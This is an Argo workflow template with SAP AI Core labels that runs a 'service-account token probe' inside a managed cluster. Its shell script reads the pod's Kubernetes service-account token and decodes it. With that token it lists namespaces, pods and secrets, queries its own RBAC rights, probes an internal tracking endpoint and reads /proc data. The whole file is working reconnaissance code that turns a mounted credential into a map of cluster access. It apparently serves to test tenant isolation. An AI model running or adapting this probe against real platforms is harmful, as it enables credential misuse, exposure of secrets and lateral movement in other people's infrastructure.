apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: argo-k8s-probe
  labels:
    scenarios.ai.sap.com/id: "argo-k8s-probe-scenario"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "argo-k8s-probe-scenario"
    executables.ai.sap.com/name: "argo-k8s-probe"
    executables.ai.sap.com/description: "k8s api sa token probe"
spec:
  entrypoint: probe
  templates:
  - name: probe
    container:
      image: python:3.11-alpine
      command: ["sh", "-c"]
      args:
      - |
        apk add -q curl 2>/dev/null
        echo "=== KEY ENV ==="
        echo "K8S_HOST=${KUBERNETES_SERVICE_HOST}"
        echo "K8S_PORT=${KUBERNETES_SERVICE_PORT_HTTPS}"
        echo "TRACKING=${AICORE_TRACKING_ENDPOINT}"
        echo "TENANT=${AI_MAIN_TENANT}"
        echo ""
        TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
        NS_PATH="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        if [ -f "$TOKEN_PATH" ]; then
          SA_TOK=$(cat "$TOKEN_PATH")
          NS=$(cat "$NS_PATH" 2>/dev/null || echo "unknown")
          echo "=== SA TOKEN ==="
          echo "len=${#SA_TOK} ns=$NS"
          echo "$SA_TOK" | cut -d. -f2 | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip()
pad=d+'='*((4-len(d)%4)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)),indent=2))
" 2>/dev/null
          echo ""
          K8S="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS:-443}"
          echo "=== K8S API: whoami ==="
          curl -sk "$K8S/apis/authentication.k8s.io/v1/selfsubjectreviews" \
            -XPOST -H "Authorization: Bearer $SA_TOK" -H "Content-Type: application/json" \
            -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>/dev/null
          echo ""
          echo "=== K8S API: namespaces ==="
          curl -sk "$K8S/api/v1/namespaces?limit=50" \
            -H "Authorization: Bearer $SA_TOK" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'items' in d: print([n['metadata']['name'] for n in d['items']])
else: print('err:', d.get('message',str(d))[:200])
" 2>/dev/null
          echo ""
          echo "=== K8S API: pods in $NS ==="
          curl -sk "$K8S/api/v1/namespaces/$NS/pods?limit=10" \
            -H "Authorization: Bearer $SA_TOK" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'items' in d: print([p['metadata']['name'] for p in d['items']])
else: print('err:', d.get('message',str(d))[:200])
" 2>/dev/null
          echo ""
          echo "=== K8S API: secrets in $NS ==="
          curl -sk "$K8S/api/v1/namespaces/$NS/secrets?limit=10" \
            -H "Authorization: Bearer $SA_TOK" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'items' in d:
    for s in d['items']: print(' ', s['metadata']['name'], s.get('type'))
else: print('err:', d.get('message',str(d))[:200])
" 2>/dev/null
          echo ""
          echo "=== K8S API: RBAC rules ==="
          curl -sk "$K8S/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -XPOST -H "Authorization: Bearer $SA_TOK" -H "Content-Type: application/json" \
            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" 2>/dev/null \
            | python3 -c "
import sys,json
d=json.load(sys.stdin)
s=d.get('status',{})
for r in s.get('resourceRules',[]): 
    if r.get('verbs') and r['verbs']!=['']: print(' ', r['verbs'], r.get('resources'), r.get('apiGroups'))
print('nonResource:')
for r in s.get('nonResourceRules',[]): print(' ', r.get('verbs'), r.get('nonResourceURLs'))
" 2>/dev/null
        else
          echo "NO SA TOKEN"
          ls -la /var/run/secrets/ 2>&1
        fi
        echo ""
        echo "=== TRACKING ENDPOINT ==="
        TRACK="${AICORE_TRACKING_ENDPOINT}"
        curl -sk "$TRACK/" -m5 -w "\nstatus=%{http_code}" | head -c 300
        echo ""
        echo "=== PROC INFO ==="
        cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '; echo
        cat /proc/self/cgroup 2>/dev/null | head -3
        echo "=== DONE ==="
